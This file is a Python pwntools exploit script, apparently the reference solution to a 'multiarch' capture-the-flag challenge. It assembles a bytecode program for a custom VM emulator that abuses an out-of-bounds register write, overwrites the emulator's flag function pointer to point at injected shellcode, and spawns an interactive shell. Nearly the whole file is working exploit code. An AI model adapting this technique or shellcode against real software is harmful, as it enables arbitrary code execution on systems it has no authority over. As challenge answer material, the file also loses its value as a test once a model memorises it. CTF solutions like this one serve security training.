#!/usr/bin/env python
# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


import dataclasses
import os
import struct
import sys

from pwn import *
import pwnlib.tubes

HOST = "hostnamehere"
PORT = 1337

BINARY_PATH = "../../pwn-multiarch-2/challenge/multiarch"
LIBC_PATH = "<libc from challenge container>"

elf = ELF(BINARY_PATH)
context.binary = elf
context.arch = elf.arch

if os.path.exists(LIBC_PATH):
    log.debug("loading chal libc")
    libc = ELF(LIBC_PATH)
else:
    log.debug("loading system libc")
    libc = ELF("/usr/lib/libc.so.6")

p: pwnlib.tubes.tube.tube

def get_cxn(masm_path: str, patched_build: bool):
    # multiarch_libpatch - just patched to use the 2.39 libc/ld
    # multiarch_patch_dmp_lib - 2.39 libc/ld patch, along with the insn dump patch
    argv = ["./multiarch_patch_dmp_lib" if patched_build else "./multiarch_libpatch", masm_path]

    if "debug" in sys.argv:
        context.terminal = ["tmux", "splitw", "-v"]
        return gdb.debug(argv, "\n".join([
            # GDB commands here
            "breakrva 1A0C",  # sys_mmap calloc()
            "breakrva 1B32",  # s.hlt
            # "breakrva 2554",  # r.add r,r
            "breakrva 2602",  # r.sub r,r
            # "breakrva 215E",  # start of r.mov
            "breakrva 196b",  # SYS_flag


            # "breakrva 0xef4ce libc.so.6"  # one_gadget
        ]))
    else:
        return process(argv)

@dataclasses.dataclass
class Insn:
    opcodes: bytes
    arch: int  # 0==stack, 1==reg

def pack_program(prog: list[Insn]) -> bytes:
    arch_bitmap = [0]*0x800

    for i in prog:
        if len(i.opcodes) < 5 and i.arch == STACKVM:
            i.opcodes = i.opcodes.ljust(5, b"\x00")

    code_bytes = b"".join(x.opcodes for x in prog)
    code_offset = 0
    for i in prog:
        print(f"{code_offset:#x}\t{i.opcodes.hex()}")
        if i.arch == 1:
            arch_bitmap[code_offset // 8] |= (1 << code_offset % 8)
        code_offset += len(i.opcodes)

    off = 4 + (5*3)

    out = b"MASM"
    out += struct.pack(b"<BHH", 1, off, len(code_bytes))
    off += len(code_bytes)
    out += struct.pack(b"<BHH", 2, off, 1)
    off += 1
    out += struct.pack(b"<BHH", 3, off, len(arch_bitmap))
    off += 1

    out += code_bytes
    out += b"\x00"
    out += bytes(arch_bitmap)

    return out

# arch bits
STACKVM = 0
REGVM = 1

# regvm mov ops
REG_A = 0
REG_B = 1
REG_C = 2
REG_D = 3
SRC_ADDR = 4
SRC_IMM = 5
SRC_SP = 6
DST_ADDR = 4

# reg vm math ops
RVMM_REG_A = 1
RVMM_REG_B = 2
RVMM_REG_C = 3
RVMM_REG_D = 4

# regvm mov prefixes
PREFIX_DEREF_DST = (0xa << 4) | (1 << 2)
PREFIX_DEREF_SRC = (0xa << 4) | 1

def pwn():
    rmov = lambda dst, src: bytes([0xc0 | (dst << 3) | src])

    use_patched_build = False

    dynalloc_base = 0xb000
    
    # offset from the sys_mmap ptr to where the emu_t obj is
    emu_obj_offset = 0x8a0

    # offset from the base of the emu obj for the flag funcptr
    emu_obj_flag_offset = 0x28

    # offset from the base of the emu obj to the stack page ptr
    emu_obj_stack_offset = 0x10

    # offset into the stack page for the shellcode
    stack_pg_sc_offset = 0xec0

    prog: list[Insn] = []
    global offset
    offset = 0
    def add_insn(opcodes: bytes, arch: int):
        prog.append(Insn(opcodes, arch))
        global offset
        offset += (5 if arch == STACKVM else len(opcodes))

    
    # do a mmap syscall to init the dynpages array
    #   r.mov a, 0 (ensure the syscall check passes)
    add_insn(rmov(REG_A, SRC_IMM) + p32(0), REGVM)
    #   s.ldd dynalloc_base
    add_insn(b"\x30" + p32(dynalloc_base), STACKVM)
    #   s.ldb 6
    add_insn(b"\x10" + p32(0x6), STACKVM)
    #   s.sys
    add_insn(b"\xa0", STACKVM)

    # write shellcode into the stack page
    shellcode = asm(shellcraft.sh())
    while len(shellcode) > 0:
        chunk = shellcode[-4:]
        shellcode = shellcode[:-4]

        # s.ldd <chunk> 
        add_insn(b"\x30" + chunk, STACKVM)
    
    for _ in range(3):
        # s.ldd nops
        add_insn(b"\x30" + b"\x90"*4, STACKVM)

    # stack pointer is 0x8ec0 rn
    #   (+0xec0 from the start of the page)

    # goal: overwrite emu->flag() with the stack page pointer

    # subtract the emu obj offset from the allocation va to mess with it
    #   r.mov A, <offset>
    add_insn(rmov(REG_A, SRC_IMM) + p32(emu_obj_offset), REGVM),
    #   r.sub 5, A (oob's the reg array)
    add_insn(b"\x30" + p8(5 << 4 | RVMM_REG_A), REGVM),

    # now the dynalloc_base eva is backed by the emu_obj itself

    # read the stack base ptr into C:D
    #   r.mov A, 0xb000+stackptr offset
    add_insn(rmov(REG_A, SRC_IMM) + p32(dynalloc_base+emu_obj_stack_offset), REGVM)
    #   r.mov D, *A
    add_insn(p8(PREFIX_DEREF_SRC) + rmov(REG_D, REG_A), REGVM)
    #   r.add A, 4
    add_insn(b"\x21" + p8(RVMM_REG_A << 4) + p32(4), REGVM),
    #   r.mov C, *A
    add_insn(p8(PREFIX_DEREF_SRC) + rmov(REG_C, REG_A), REGVM)
    
    # adjust the stack ptr to be at the top of the nop sled
    #   r.add D, stack_pg_sc_offset
    add_insn(b"\x21" + p8(RVMM_REG_D << 4) + p32(stack_pg_sc_offset), REGVM),

    # write the shellcode pointer to the flag func slot
    #   r.mov A, 0xb000+flag func offset
    add_insn(rmov(REG_A, SRC_IMM) + p32(dynalloc_base+emu_obj_flag_offset), REGVM),
    #   r.mov *A, D
    add_insn(p8(PREFIX_DEREF_DST) + rmov(REG_A, REG_D), REGVM)
    #   r.add A, 4
    add_insn(b"\x21" + p8(RVMM_REG_A << 4) + p32(4), REGVM),
    #   r.mov *A, C
    add_insn(p8(PREFIX_DEREF_DST) + rmov(REG_A, REG_C), REGVM)

    # SYS_flag - jmp to the shellcode page
    #   r.mov a, 0
    add_insn(rmov(REG_A, SRC_IMM) + p32(0), REGVM),
    #   s.ldb 5
    add_insn(b"\x10" + p32(0x5), STACKVM)
    #   s.sys
    add_insn(b"\xa0", STACKVM)
    
    path = "pwn.masm"
    with open(path, "wb") as f:
        packed = pack_program(prog)
        log.info(f"wrote exploit payload to {path} ({f.write(packed)} bytes)")
    
    global p
    p = get_cxn(path, use_patched_build)

    p.interactive()

if __name__ == "__main__":
    pwn()
